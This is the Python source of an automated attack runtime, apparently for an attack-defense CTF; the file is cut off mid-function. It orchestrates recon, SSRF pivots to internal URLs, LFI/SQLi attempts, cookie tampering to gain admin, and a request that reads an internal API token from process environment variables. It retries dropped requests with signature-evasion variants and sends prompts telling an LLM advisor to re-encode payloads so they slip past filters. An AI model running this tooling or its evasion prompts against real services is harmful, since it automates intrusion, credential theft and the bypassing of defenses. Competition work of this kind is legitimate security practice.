"""수명주기 오케스트레이터 — 관측 → 계획 → 실행 → 제출.

설계 §9.4·§9.5·§9.10·§9.13. 구성요소를 typed egress·Round 비밀 저장소·증거 binding으로 엮어
공정 스케줄러로 표적을 순회한다. 각 계획은 실행 직전 capability·Round·endpoint·TTL·증거·부작용을
재검증하고, 상대 방어 필터에 DROP되면 시그니처 회피 변형으로 재시도한다. 오류는 표적 단위로
격리하고, Round 종료 시 비밀 원문·증거·중복 집합을 폐기한다.
"""

from __future__ import annotations

import base64
import json
import re
import time
import threading
from concurrent.futures import ThreadPoolExecutor

from . import ATTACK_PROFILE, __version__ as ATTACKER_VERSION
from .audit import AuditLogger, Redactor
from .config import AttackerConfig
from .egress import EgressError, EgressGateway, build_allowlists
from .exploits import (
    Attempt,
    GrpcAttempt,
    auth_tamper_attempts,
    build_attempts,
    extract_internal_urls,
    extract_svc_flag_paths,
    observed_attempts,
    observed_grpc_attempts,
    observed_grpc_bootstrap,
    ssrf_pivot_attempts,
    tamper_token,
)
from .flags import FlagPipeline, SubmitClient
from .llm_advisor import (
    LLMAdvisor,
    MAX_LLM_CALLS_PER_ROUND,
)
from .models import (
    Capability,
    Endpoint,
    ExecutionPlan,
    Outcome,
    RoundBudget,
    SideEffectClass,
    SubmitState,
    VulnClass,
)
from .observation import EvidenceFactory, Observer, UrllibHttp
from .phase_policy import FairScheduler, cumulative_endpoint_order
from .planner import EndpointState, Planner, MAX_TURNS
from .playbook import Playbook
from .profiles import service_fingerprint, suggest_vuln_classes
from .protocol_transport import MQTT_PORT, MQTT_READ_TOPICS, RTSP_DISCOVERY_PATHS, RTSP_PORT
from .rate_limit import RateLimiter
from .recon import COMMON_PROBE_PATHS, DISCOVERY_PROBE_PATHS
from .round_report import RoundReport
from .secrets import KIND_LLM_KEY, KIND_SESSION, KIND_SUBMIT_TOKEN, RoundSecretStore
from .tools import ExecutionAdapter, PlanBindingError, evasion_variants

MAX_LLM_TURNS_PER_ENDPOINT = 2
LOOP_SLEEP = 4.0
PER_TARGET_BUDGET = 1
MAX_EVASION_VARIANTS = 6
ENDPOINT_RETRY_COOLDOWN = 30.0
BOOTSTRAP_RETRY_COOLDOWN = 1.0
PLAN_TTL = 30.0
EVIDENCE_TTL = 90.0
ROUND_DURATION = 20 * 60.0  # Round 20분 → 제출 재시도 경계
MAX_DISCOVERY_TEXT = 4096
MAX_DISCOVERY_BODY = 512


class AttackerRuntime:
    """공격 런타임. 의존성 주입 가능(네트워크 없이 테스트)."""

    def __init__(self, config: AttackerConfig, http=None, rate=None,
                 clock=time.monotonic, sleep=time.sleep, audit=None, budget=None):
        self.config = config
        self.transport = http or UrllibHttp()
        self.rate = rate or RateLimiter(clock=clock, sleep=sleep)
        self.clock = clock
        self.sleep = sleep
        self.budget = budget or RoundBudget()
        # 로그에서 제출 토큰·LLM 키를 제거(원문은 저장소로 옮기지만 config가 origin).
        self.audit = audit or AuditLogger(Redactor({
            self.config.submit_token, self.config.llm_api_key,
        }))
        self._round_seq = 0
        # run_once에서 설정하는 Round 한정 컴포넌트
        self._round_id = ""
        self._round_deadline = 0.0
        self._secret_store = None
        self._observer = None
        self._adapter = None
        self._pipeline = None
        self._planner = None
        self._report = None
        self._playbook = None
        self._round_active = False
        self._state_lock = threading.Lock()
        self._stop_event = threading.Event()
        self._completed_endpoints = set()
        self._responsive_endpoints = set()
        self._endpoint_retry_state = {}
        self._latest_evidence_refs = {}

    def request_stop(self) -> None:
        """새 요청을 중단한다. signal handler에서는 lock을 획득하지 않는다."""
        self._stop_event.set()

    # ---- Round 컨텍스트 구성 ----

    def _build_round(self) -> None:
        self._round_seq += 1
        self._round_id = f"round-{self._round_seq}"
        self.budget.reset()  # 라운드별 예산 격리 — 누적 상한/보고 왜곡 방지
        now = self.clock()
        self._round_deadline = now + ROUND_DURATION
        store = RoundSecretStore(self._round_id, clock=self.clock)
        submit_handle = (store.put(KIND_SUBMIT_TOKEN, self.config.submit_token)
                         if self.config.submit_token else None)
        llm_handle = (store.put(KIND_LLM_KEY, self.config.llm_api_key)
                      if self.config.llm_api_key else None)
        self._secret_store = store

        egress = EgressGateway(self.transport, build_allowlists(self.config))
        evidence = EvidenceFactory(self._round_id, self.clock, EVIDENCE_TTL)

        self._observer = Observer(egress, self.rate, self._round_id, self.clock, evidence)
        self._adapter = ExecutionAdapter(
            egress, self.rate, self._round_id, self.clock, evidence,
            secret_store=store,
        )
        advisor = LLMAdvisor(egress, self.config, self.budget, store, llm_handle)
        self._planner = Planner(advisor)
        submit_client = SubmitClient(
            egress, self.rate, self.config.submit_url, submit_handle, store,
            clock=self.clock, sleep=self.sleep, round_deadline=self._round_deadline)
        self._pipeline = FlagPipeline(submit_client, store)
        self._report = RoundReport(budget=self.budget)
        self._playbook = Playbook()  # Round 한정 교차 재사용(비밀 없음)
        with self._state_lock:
            self._completed_endpoints.clear()
            self._responsive_endpoints.clear()
            self._endpoint_retry_state.clear()
            self._latest_evidence_refs.clear()

    def start_round(self) -> RoundReport:
        """공식 Round를 연다. 이미 열려 있으면 같은 Round를 유지한다."""
        if not self._round_active:
            self._build_round()
            self._round_active = True
        return self._report

    def _finish_round(self) -> None:
        """Round 비밀을 폐기한다. 반복 호출해도 안전하다."""
        if not self._round_active:
            return
        self._secret_store.expire_all()
        with self._state_lock:
            self._completed_endpoints.clear()
            self._endpoint_retry_state.clear()
            self._latest_evidence_refs.clear()
        self._round_active = False

    def finish_round(self) -> None:
        """공식 Round를 종료하고 비밀 원문을 폐기한다."""
        self._finish_round()

    def _bind_plan(self, plan: ExecutionPlan, endpoint, evidence_ref) -> ExecutionPlan:
        now = self.clock()
        plan.plan_id = f"plan-{self._round_id}-{endpoint.endpoint_id}-{now}"
        plan.round_id = self._round_id
        plan.endpoint_id = endpoint.endpoint_id
        plan.capability = Capability.ATTACK_TARGET
        plan.evidence_refs = [evidence_ref] if evidence_ref else []
        plan.created_at_monotonic = now
        plan.expires_at_monotonic = now + PLAN_TTL
        if plan.side_effect_class is None:
            plan.side_effect_class = SideEffectClass.READ_ONLY
        return plan

    # ---- flag 처리 ----

    def _process_flags(self, body: str, headers=None) -> bool:
        """본문과 응답 헤더의 flag를 모두 처리한다.

        반환값은 이 호출에서 **새로 제출해 accepted 된 flag가 있는가**다. 이미 같은
        Round에서 처리한 flag를 다시 본 것은 endpoint 탐색 진전으로 세지 않는다.
        """
        newly_accepted = False
        texts = [body or ""]
        texts.extend(str(value) for value in (headers or {}).values() if value is not None)
        for text in texts:
            for fp, state, submitted in self._pipeline.process(text):
                if submitted:
                    self._report.record_submit(fp, state)
                if submitted and state == SubmitState.ACCEPTED:
                    newly_accepted = True
        return newly_accepted

    def _remember_evidence(self, endpoint, evidence_ref) -> None:
        if evidence_ref is None:
            return
        with self._state_lock:
            self._latest_evidence_refs[endpoint.endpoint_id] = evidence_ref

    def _latest_evidence(self, endpoint, fallback=None):
        with self._state_lock:
            return self._latest_evidence_refs.get(endpoint.endpoint_id, fallback)

    @staticmethod
    def _binding_reason(exc: PlanBindingError) -> str:
        message = str(exc)
        if "증거" in message:
            return "evidence-stale-or-missing"
        if "TTL" in message:
            return "plan-expired"
        if "Round" in message:
            return "round-mismatch"
        if "endpoint" in message:
            return "endpoint-mismatch"
        if "부작용" in message or "변경 작업" in message:
            return "side-effect-gate"
        return "binding-invalid"

    def _feedback(self, plan: ExecutionPlan, result) -> str:
        obs = result.observation
        method, path = plan.args["method"], plan.args["path"]
        if result.outcome == Outcome.TIMEOUT:
            return (f"Your request {method} {path} got NO response (dropped/timeout) though GET / "
                    "worked — an inline filter is DROPPING it by payload signature. Re-encode to evade "
                    "while keeping the SAME exploit and target path. Reply ONLY the JSON object.")
        hdrs = "; ".join(f"{k}:{v}" for k, v in obs.redacted_header_hints.items())
        return (f"Your request {method} {path} returned HTTP {obs.status}. "
                f"Notable headers: {hdrs or '-'}. Body: {result.body[:300]}. "
                "No flag yet. Craft a DIFFERENT, more specific request escalating the SAME vuln "
                "(deeper path, schema enumeration, spoofed header, internal root). Reply ONLY the JSON object.")

    def _try_evasion(self, plan: ExecutionPlan, evidence_ref):
        """무응답(필터 DROP) 시 동일 의도의 재인코딩 변형으로 재시도한다."""
        first_success = None
        for variant in evasion_variants(
                plan.args["path"], endpoint_port=plan.target.port)[:MAX_EVASION_VARIANTS]:
            if self._stop_event.is_set():
                break
            now = self.clock()
            vplan = ExecutionPlan(
                tool=plan.tool, target=plan.target,
                args={**plan.args, "path": variant},
                plan_id=f"{plan.plan_id}-evade",
                round_id=self._round_id, endpoint_id=plan.target.endpoint_id,
                capability=Capability.ATTACK_TARGET,
                evidence_refs=[evidence_ref] if evidence_ref else [],
                created_at_monotonic=now, expires_at_monotonic=now + PLAN_TTL,
                side_effect_class=plan.side_effect_class,
                timeout=plan.timeout, scenario=plan.scenario, reason="evasion:" + plan.reason)
            try:
                vresult = self._adapter.execute(vplan)
            except (PlanBindingError, EgressError):
                return None, False
            self._report.record_request()
            self._remember_evidence(plan.target, vresult.observation.evidence_ref)
            if self._stop_event.is_set():
                break
            if self._process_flags(vresult.body, vresult.observation.redacted_header_hints):
                return vresult, True
            if vresult.outcome == Outcome.SUCCESS and first_success is None:
                first_success = vresult
        return first_success, False

    # ---- 결정론적 사전 정찰 (LLM 전, 토큰 0) ----

    def _recon(self, endpoint, evidence_ref, discovery_only=False) -> tuple:
        """읽기 전용 probe 응답을 bounded discovery text로 돌려준다.

        L4/UGV의 구체 route는 사전 가정하지 않는다. `/status`·`robots.txt` 등 실제 응답이
        노출한 path·parameter만 다음 결정론 공격의 배너 근거로 사용한다.
        """
        discovery = []
        captured_any = False
        probe_paths = DISCOVERY_PROBE_PATHS if discovery_only else COMMON_PROBE_PATHS
        for path in probe_paths:
            if self._stop_event.is_set():
                break
            now = self.clock()
            plan = ExecutionPlan(
                tool="http", target=endpoint, args={"method": "GET", "path": path},
                plan_id=f"recon-{self._round_id}-{endpoint.endpoint_id}-{path}",
                round_id=self._round_id, endpoint_id=endpoint.endpoint_id,
                capability=Capability.ATTACK_TARGET,
                evidence_refs=[evidence_ref] if evidence_ref else [],
                created_at_monotonic=now, expires_at_monotonic=now + PLAN_TTL,
                side_effect_class=SideEffectClass.READ_ONLY, reason="recon")
            try:
                result = self._adapter.execute(plan)
            except (PlanBindingError, EgressError):
                continue
            self._report.record_request()
            evidence_ref = result.observation.evidence_ref  # 다음 프로브용 신선한 증거
            self._remember_evidence(endpoint, evidence_ref)
            if self._stop_event.is_set():
                break
            if self._process_flags(result.body, result.observation.redacted_header_hints):
                self.audit.log("hit", target=endpoint.key(), path=path, reason="recon")
                captured_any = True
                # flag 원문이 포함된 응답은 discovery/LLM 입력으로 넘기지 않는다.
                continue
            body = (result.body or "").strip()
            if body:
                discovery.append(body[:MAX_DISCOVERY_BODY])
        return captured_any, "\n".join(discovery)[:MAX_DISCOVERY_TEXT], evidence_ref

    def _run_bound_exploit(self, endpoint, args, evidence_ref, reason):
        """비밀 없는 exploit 형태(method·path)를 READ_ONLY 계획으로 실행한다(playbook 재사용용)."""
        if self._stop_event.is_set():
            return None, False
        now = self.clock()
        plan = ExecutionPlan(
            tool="http", target=endpoint,
            args={"method": args.get("method", "GET"), "path": args.get("path", "/"),
                  "headers": args.get("headers", {}) or {}, "body": args.get("body", "") or ""},
            plan_id=f"pb-{self._round_id}-{endpoint.endpoint_id}",
            round_id=self._round_id, endpoint_id=endpoint.endpoint_id,
            capability=Capability.ATTACK_TARGET,
            evidence_refs=[evidence_ref] if evidence_ref else [],
            created_at_monotonic=now, expires_at_monotonic=now + PLAN_TTL,
            side_effect_class=SideEffectClass.READ_ONLY, reason=reason)
        try:
            result = self._adapter.execute(plan)
        except (PlanBindingError, EgressError):
            return None, False
        self._report.record_request()
        self._remember_evidence(endpoint, result.observation.evidence_ref)
        if self._stop_event.is_set():
            return result, False
        captured = self._process_flags(result.body, result.observation.redacted_header_hints)
        if not captured and result.outcome == Outcome.TIMEOUT:
            evaded, captured = self._try_evasion(plan, result.observation.evidence_ref)
            if evaded is not None:
                result = evaded
        return result, captured

    # ---- 결정론적 exploit 엔진 (LLM 전, 토큰 0) ----

    def _execute_attempt(self, endpoint, attempt: Attempt, evidence_ref):
        """단일 결정론 시도를 READ_ONLY 계획으로 실행한다. (result, captured) 반환.

        무응답(필터 DROP)이면 경로 재인코딩 evasion 변형으로 재시도한다.
        """
        if self._stop_event.is_set():
            return None, False
        now = self.clock()
        plan = ExecutionPlan(
            tool="http", target=endpoint,
            args={"method": attempt.method, "path": attempt.path,
                  "headers": dict(attempt.headers), "body": attempt.body or ""},
            plan_id=f"exp-{self._round_id}-{endpoint.endpoint_id}-{now}",
            round_id=self._round_id, endpoint_id=endpoint.endpoint_id,
            capability=Capability.ATTACK_TARGET,
            evidence_refs=[evidence_ref] if evidence_ref else [],
            created_at_monotonic=now, expires_at_monotonic=now + PLAN_TTL,
            side_effect_class=SideEffectClass.READ_ONLY,
            reason="det:" + attempt.reason)
        try:
            result = self._adapter.execute(plan)
        except (PlanBindingError, EgressError):
            return None, False
        self._report.record_request()
        self._remember_evidence(endpoint, result.observation.evidence_ref)
        if self._stop_event.is_set():
            return result, False
        if self._process_flags(result.body, result.observation.redacted_header_hints):
            return result, True
        if result.outcome == Outcome.TIMEOUT:
            evaded, captured = self._try_evasion(plan, result.observation.evidence_ref)
            if captured:
                return evaded, True
            if evaded is not None:
                return evaded, False
        return result, False

    def _execute_grpc_attempt(self, endpoint, attempt: GrpcAttempt, evidence_ref):
        """관측된 gRPC 시도를 evidence에 묶어 실행한다."""
        if self._stop_event.is_set():
            return None, False
        now = self.clock()
        side_effect = (
            SideEffectClass.BOUNDED_FLAG_DIRECTED_MUTATION
            if attempt.mutating
            else SideEffectClass.READ_ONLY
        )
        plan = ExecutionPlan(
            tool="grpc",
            target=endpoint,
            args={
                "rpc": attempt.rpc,
                "string_fields": attempt.strings(),
                "varint_fields": attempt.varints(),
                "delivery": attempt.delivery,
            },
            plan_id=f"grpc-{self._round_id}-{endpoint.endpoint_id}-{now}",
            round_id=self._round_id,
            endpoint_id=endpoint.endpoint_id,
            capability=Capability.ATTACK_TARGET,
            evidence_refs=[evidence_ref] if evidence_ref else [],
            created_at_monotonic=now,
            expires_at_monotonic=now + PLAN_TTL,
            side_effect_class=side_effect,
            preconditions=(
                ["bounded", "flag-directed", "safe-stop"] if attempt.mutating else []
            ),
            reason="det:" + attempt.reason,
        )
        try:
            result = self._adapter.execute(plan)
        except (PlanBindingError, EgressError):
            return None, False
        self._report.record_request()
        self._remember_evidence(endpoint, result.observation.evidence_ref)
        if self._stop_event.is_set():
            return result, False
        return result, self._process_flags(
            result.body, result.observation.redacted_header_hints
        )

    def _execute_protocol_attempt(self, endpoint, tool: str, args: dict,
                                  evidence_ref, reason: str):
        """관측된 MQTT/RTSP의 읽기 전용 계획을 공통 preflight로 실행한다."""
        if self._stop_event.is_set():
            return None, False
        now = self.clock()
        plan = ExecutionPlan(
            tool=tool,
            target=endpoint,
            args=args,
            plan_id=f"{tool}-{self._round_id}-{endpoint.endpoint_id}-{now}",
            round_id=self._round_id,
            endpoint_id=endpoint.endpoint_id,
            capability=Capability.ATTACK_TARGET,
            evidence_refs=[evidence_ref] if evidence_ref else [],
            created_at_monotonic=now,
            expires_at_monotonic=now + PLAN_TTL,
            side_effect_class=SideEffectClass.READ_ONLY,
            reason="det:" + reason,
        )
        try:
            result = self._adapter.execute(plan)
        except (PlanBindingError, EgressError):
            return None, False
        self._report.record_request()
        self._remember_evidence(endpoint, result.observation.evidence_ref)
        return result, self._process_flags(
            result.body, result.observation.redacted_header_hints
        )

    def _attack_observed_mqtt(self, endpoint) -> tuple[bool, bool]:
        """1883에서 MQTT를 확인한 뒤 wildcard read subscription만 수행한다."""
        if endpoint.port != MQTT_PORT:
            return False, False
        obs, resp = self._observer.observe_mqtt(endpoint)
        self._report.record_observation()
        self._report.record_request()
        self._remember_evidence(endpoint, obs.evidence_ref)
        if resp.status == 0:
            return False, False
        with self._state_lock:
            self._responsive_endpoints.add(endpoint.endpoint_id)
        self.audit.log("protocol-observed", target=endpoint.key(), scheme="mqtt")
        captured_any = self._process_flags(resp.body, resp.headers)
        if resp.status != 200 or self._stop_event.is_set():
            return True, captured_any
        result, captured = self._execute_protocol_attempt(
            endpoint,
            "mqtt",
            {"topics": list(MQTT_READ_TOPICS)},
            obs.evidence_ref,
            "observed:l3-mqtt-read-subscribe",
        )
        if captured:
            captured_any = True
            self.audit.log(
                "hit", target=endpoint.key(), path="MQTT SUBSCRIBE",
                reason="det:observed:l3-mqtt-read-subscribe",
            )
        return True, captured_any

    def _attack_observed_rtsp(self, endpoint) -> tuple[bool, bool]:
        """8554에서 RTSP OPTIONS로 확인 후 bounded DESCRIBE만 수행한다."""
        if endpoint.port != RTSP_PORT:
            return False, False
        obs, resp = self._observer.observe_rtsp(endpoint, "OPTIONS", "*")
        self._report.record_observation()
        self._report.record_request()
        self._remember_evidence(endpoint, obs.evidence_ref)
        if resp.status == 0:
            return False, False
        with self._state_lock:
            self._responsive_endpoints.add(endpoint.endpoint_id)
        self.audit.log("protocol-observed", target=endpoint.key(), scheme="rtsp")
        captured_any = self._process_flags(resp.body, resp.headers)
        evidence_ref = obs.evidence_ref
        for path in RTSP_DISCOVERY_PATHS:
            if self._stop_event.is_set():
                break
            result, captured = self._execute_protocol_attempt(
                endpoint,
                "rtsp",
                {"method": "DESCRIBE", "path": path},
                evidence_ref,
                "observed:l3-rtsp-describe",
            )
            if result is not None:
                evidence_ref = result.observation.evidence_ref
            if captured:
                captured_any = True
                self.audit.log(
                    "hit", target=endpoint.key(), path=path,
                    reason="det:observed:l3-rtsp-describe",
                )
        return True, captured_any

    def _attack_observed_grpc(self, endpoint) -> tuple:
        """본선 9000 gRPC를 HTTP 오탐 없이 bootstrap하고 bounded 후보를 실행한다.

        반환은 ``(protocol_handled, accepted_flag)``이다. gRPC가 응답하지 않으면 다른
        protocol일 가능성을 위해 기존 HTTP→HTTPS→passive 탐색으로 회귀한다.
        """
        bootstrap_rpc = observed_grpc_bootstrap(endpoint.port)
        if bootstrap_rpc is None:
            return False, False
        obs, resp = self._observer.observe_grpc(endpoint, bootstrap_rpc)
        self._report.record_observation()
        self._report.record_request()
        self._remember_evidence(endpoint, obs.evidence_ref)
        if resp.status == 0:
            return False, False
        with self._state_lock:
            self._responsive_endpoints.add(endpoint.endpoint_id)
        self.audit.log("protocol-observed", target=endpoint.key(), scheme="grpc-h2c")
        captured_any = self._process_flags(resp.body, resp.headers)
        evidence_ref = obs.evidence_ref
        # Health/Probe 응답에 gateway_path가 있으면 동일 L1 HTTP:8080으로 즉시 피벗.
        captured_any = self._pivot_satdiag_gateway(endpoint, resp.body) or captured_any
        for attempt in observed_grpc_attempts(endpoint.port):
            if self._stop_event.is_set():
                break
            result, captured = self._execute_grpc_attempt(
                endpoint, attempt, evidence_ref
            )
            if result is not None:
                evidence_ref = result.observation.evidence_ref
                captured_any = (
                    self._pivot_satdiag_gateway(endpoint, result.body) or captured_any
                )
            if captured:
                captured_any = True
                self.audit.log(
                    "hit",
                    target=endpoint.key(),
                    path=attempt.rpc,
                    vuln=attempt.vuln.value,
                    reason="det:" + attempt.reason,
                )
        return True, captured_any

    def _pivot_satdiag_gateway(self, endpoint, body: str) -> bool:
        """gRPC 응답의 ``/svc/flag-…`` 경로를 같은 host:8080 GET으로 회수한다(P2-R4).

        9000에서 생성된 evidence는 8080 실행 근거로 쓸 수 없다. 같은 host의 8080을
        먼저 관측해 정확한 endpoint에 결속된 신선한 evidence를 만든 뒤 피벗한다.
        """
        if 8080 not in self.config.ports:
            return False
        paths = extract_svc_flag_paths(body or "")
        if not paths:
            return False
        http_ep = Endpoint(endpoint.host, 8080)
        captured_any = False
        evidence_ref = self._latest_evidence(http_ep)
        if not (
            evidence_ref
            and evidence_ref.valid_at(self.clock(), self._round_id, http_ep.endpoint_id)
        ):
            obs, resp = self._observer.observe_banner(http_ep)
            self._report.record_observation()
            self._report.record_request()
            self._remember_evidence(http_ep, obs.evidence_ref)
            evidence_ref = obs.evidence_ref
            if resp.status == 0:
                return False
            with self._state_lock:
                self._responsive_endpoints.add(http_ep.endpoint_id)
            captured_any = self._process_flags(resp.body, resp.headers)
        for path in paths:
            if self._stop_event.is_set():
                break
            attempt = Attempt(
                VulnClass.OTHER, "GET", path,
                reason="observed:satdiag-gateway-svc-flag",
            )
            result, captured = self._execute_attempt(http_ep, attempt, evidence_ref)
            if captured:
                captured_any = True
                self.audit.log(
                    "hit",
                    target=http_ep.key(),
                    path=path,
                    reason="det:observed:satdiag-gateway-svc-flag",
                )
            if result is not None:
                evidence_ref = result.observation.evidence_ref
        return captured_any

    @staticmethod
    def _cookie_from_headers(headers) -> tuple:
        """Set-Cookie 헤더에서 (name, value)를 뽑는다. 없으면 (None, None)."""
        for key, val in (headers or {}).items():
            if key.lower() == "set-cookie" and "=" in val:
                pair = val.split(";", 1)[0].strip()
                name, _, value = pair.partition("=")
                if name and value:
                    return name.strip(), value.strip()
        return None, None

    def _attack_l2_session_chains(self, endpoint, evidence_ref) -> bool:
        """Use a fresh guest session for the observed RSC and mission-feed reads.

        Session plaintext is extracted into the Round secret store immediately and
        only a ``SecretHandle`` crosses planning code.  It is resolved by the
        execution adapter at the transport boundary.
        """
        if endpoint.port != 8082 or endpoint.scheme != "http" or evidence_ref is None:
            return False

        def plan(tool: str, args: dict, reason: str, current_evidence):
            now = self.clock()
            return ExecutionPlan(
                tool=tool,
                target=endpoint,
                args=args,
                plan_id=f"l2-{self._round_id}-{endpoint.endpoint_id}-{now}",
                round_id=self._round_id,
                endpoint_id=endpoint.endpoint_id,
                capability=Capability.ATTACK_TARGET,
                evidence_refs=[current_evidence],
                created_at_monotonic=now,
                expires_at_monotonic=now + PLAN_TTL,
                side_effect_class=SideEffectClass.READ_ONLY,
                reason=reason,
            )

        try:
            session_result = self._adapter.execute(plan(
                "http",
                {
                    "method": "POST",
                    "path": "/api/session",
                    "headers": {"Accept": "application/json"},
                    "body": "",
                },
                "det:observed:l2-session-bootstrap",
                evidence_ref,
            ))
        except (PlanBindingError, EgressError):
            return False
        self._report.record_request()
        self._remember_evidence(endpoint, session_result.observation.evidence_ref)
        try:
            document = json.loads(session_result.body)
        except (TypeError, json.JSONDecodeError):
            return False
        token = document.get("sessionToken") if isinstance(document, dict) else None
        if not isinstance(token, str) or re.fullmatch(r"[0-9a-fA-F]{32}", token) is None:
            return False
        session_handle = self._secret_store.put(KIND_SESSION, token)

        captured_any = False
        current_evidence = session_result.observation.evidence_ref
        ref = base64.b64encode(b"process.env.MC2_INTERNAL_API_TOKEN").decode("ascii")
        rsc_plan = plan(
            "http",
            {
                "method": "POST",
                "path": "/api/rsc-action",
                "headers": {"Accept": "application/json"},
                "json_body": {"ref": ref, "token": session_handle},
            },
            "det:observed:l2-rsc-fresh-session",
            current_evidence,
        )
        try:
            rsc_result = self._adapter.execute(rsc_plan)
        except (PlanBindingError, EgressError):
            rsc_result = None
        if rsc_result is not None:
            self._report.record_request()
            self._remember_evidence(endpoint, rsc_result.observation.evidence_ref)
            current_evidence = rsc_result.observation.evidence_ref
            if self._process_flags(
                rsc_result.body, rsc_result.observation.redacted_header_hints
            ):
                captured_any = True
                self.audit.log(
                    "hit", target=endpoint.key(), path="/api/rsc-action",
                    reason="det:observed:l2-rsc-fresh-session",
                )

        ws_plan = plan(
            "websocket",
            {"path": "/ws/mission-feed", "token": session_handle},
            "det:observed:l2-ws-fresh-session",
            current_evidence,
        )
        try:
            ws_result = self._adapter.execute(ws_plan)
        except (PlanBindingError, EgressError):
            ws_result = None
        if ws_result is not None:
            self._report.record_request()
            self._remember_evidence(endpoint, ws_result.observation.evidence_ref)
            if self._process_flags(
                ws_result.body, ws_result.observation.redacted_header_hints
            ):
                captured_any = True
                self.audit.log(
                    "hit", target=endpoint.key(), path="/ws/mission-feed",
                    reason="det:observed:l2-ws-fresh-session",
                )
        return captured_any

    def _deterministic_exploit(self, endpoint, banner, banner_fp,
                               banner_headers, evidence_ref, attempts=None,
                               attempted_keys=None, include_cookie_tamper=True,
                               observed_only=False) -> bool:
        """배너 힌트로 4개 취약 부류(SSRF·LFI·AUTH·SQLI)를 토큰 0으로 시도한다.

        SSRF 2단 피벗은 base 시도 직후 **즉시** 실행한다. 승리 경로(예: /registry가 흘린
        내부 URL 재프록시)를 sweep 끝까지 미루면, 그 사이 base 요청이 표적의 rate limit을
        먼저 소진해 정작 피벗이 throttle될 수 있다. AUTH는 노출된 세션 토큰을 변조해 재전송한다.
        성공 형태는 playbook에 기록해 같은 배너의 다른 표적에 재사용한다.
        """
        hints = suggest_vuln_classes(banner)
        attempts = (build_attempts(
                        banner, hints, endpoint.port, observed_only=observed_only)
                    if attempts is None else list(attempts))
        attempted_keys = attempted_keys if attempted_keys is not None else set()
        cookie_name, cookie_val = self._cookie_from_headers(banner_headers)
        pivoted = set()            # 이미 피벗한 내부 URL(중복 방지)
        captured_any = False

        def run(attempt) -> bool:
            nonlocal evidence_ref, cookie_name, cookie_val, captured_any
            if self._stop_event.is_set():
                return False
            attempt_key = (
                attempt.method,
                attempt.path,
                tuple(sorted(attempt.headers.items())),
                attempt.body,
            )
            if attempt_key in attempted_keys:
                return False
            attempted_keys.add(attempt_key)
            result, captured = self._execute_attempt(endpoint, attempt, evidence_ref)
            if captured:
                winning_args = result.plan.args if result is not None else {
                    "method": attempt.method,
                    "path": attempt.path,
                    "headers": dict(attempt.headers),
                    "body": attempt.body,
                }
                self._playbook.record(banner_fp, {
                    "method": winning_args.get("method", attempt.method),
                    "path": winning_args.get("path", attempt.path),
                    "headers": winning_args.get("headers", dict(attempt.headers)),
                    "body": winning_args.get("body", attempt.body),
                })
                self.audit.log("hit", target=endpoint.key(),
                               path=winning_args.get("path", attempt.path),
                               vuln=attempt.vuln.value, reason="det:" + attempt.reason)
                captured_any = True
            if result is None:
                return captured
            evidence_ref = result.observation.evidence_ref
            if cookie_name is None:
                cn, cv = self._cookie_from_headers(result.observation.redacted_header_hints)
                if cn:
                    cookie_name, cookie_val = cn, cv
            # SSRF base 응답이면 즉시 2단 피벗(승리 경로를 앞당겨 표적 rate limit 전에 회수).
            # 피벗 응답 자체는 다시 피벗하지 않는다(reason 구분).
            if (attempt.vuln == VulnClass.SSRF and attempt.reason != "ssrf:pivot"
                    and "?" in attempt.path):
                base, _, query = attempt.path.partition("?")
                param = query.split("=", 1)[0]
                fresh = [u for u in extract_internal_urls(result.body) if u not in pivoted]
                pivoted.update(fresh)
                for pivot in ssrf_pivot_attempts(base, param, fresh):
                    if self._stop_event.is_set():
                        break
                    run(pivot)
            return captured

        for attempt in attempts:
            if self._stop_event.is_set():
                break
            run(attempt)

        # AUTH 세션 변조 — 노출된 토큰을 관리자 권한으로 올려 재전송한다
        if include_cookie_tamper and not observed_only and cookie_name and cookie_val:
            tokens = tamper_token(cookie_val)
            for attempt in auth_tamper_attempts(cookie_name, tokens):
                if self._stop_event.is_set():
                    break
                run(attempt)
        return captured_any

    # ---- 단일 표적 공격 ----

    def attack_endpoint(self, endpoint) -> bool:
        if self._stop_event.is_set():
            return False
        mqtt_handled, mqtt_captured = self._attack_observed_mqtt(endpoint)
        if mqtt_handled:
            return mqtt_captured
        rtsp_handled, rtsp_captured = self._attack_observed_rtsp(endpoint)
        if rtsp_handled:
            return rtsp_captured
        grpc_handled, grpc_captured = self._attack_observed_grpc(endpoint)
        if grpc_handled:
            return grpc_captured
        obs, resp, endpoint, bootstrap_requests = self._observer.observe_banner_adaptive(endpoint)
        for _ in range(bootstrap_requests):
            self._report.record_observation()
            self._report.record_request()
        self._remember_evidence(endpoint, obs.evidence_ref)
        if self._stop_event.is_set():
            return False
        if obs.no_response:
            tcp_obs, tcp_resp = self._observer.observe_passive_banner(endpoint)
            self._report.record_observation()
            self._report.record_request()
            self._remember_evidence(endpoint, tcp_obs.evidence_ref)
            if tcp_resp.status != 0:
                with self._state_lock:
                    self._responsive_endpoints.add(endpoint.endpoint_id)
            captured = self._process_flags(tcp_resp.body, tcp_resp.headers)
            if captured:
                self.audit.log(
                    "hit", target=endpoint.key(), turn=0,
                    path="PASSIVE_TCP_BANNER", reason="passive-tcp-banner",
                )
                return True
            self.audit.log(
                "skip", target=endpoint.key(),
                reason="no-http-https-or-passive-banner",
            )
            return False

        with self._state_lock:
            self._responsive_endpoints.add(endpoint.endpoint_id)

        if endpoint.scheme == "https":
            self.audit.log("protocol-observed", target=endpoint.key(), scheme="https")

        current_evidence = obs.evidence_ref
        # 포트까지 키에 넣는다. 동일 배너라도 L4처럼 포트별 route가 다르면
        # playbook 재사용이 다른 서비스 경로를 섞지 않게 한다(CI flake 방지).
        banner_fp = (
            f"{endpoint.port}:"
            f"{service_fingerprint(obs.status, resp.body or '', resp.headers)}"
        )
        banner = (resp.body or "").strip()
        captured_any = self._process_flags(resp.body, resp.headers)
        if captured_any:
            self.audit.log("hit", target=endpoint.key(), turn=0, path="/", reason="banner")

        captured_any = (
            self._attack_l2_session_chains(endpoint, current_evidence) or captured_any
        )
        current_evidence = self._latest_evidence(endpoint, current_evidence)

        attempted_keys = set()

        # TEAM1 PCAP에서 성공이 확인된 L1~L3 형태를 일반 정찰보다 먼저 실행한다.
        confirmed = observed_attempts(endpoint.port)
        observed_only = not bool(confirmed)
        if confirmed:
            captured_any = self._deterministic_exploit(
                endpoint, banner, banner_fp, resp.headers, current_evidence,
                attempts=confirmed, attempted_keys=attempted_keys,
                include_cookie_tamper=False) or captured_any
        if self._stop_event.is_set():
            return captured_any
        current_evidence = self._latest_evidence(endpoint, current_evidence)

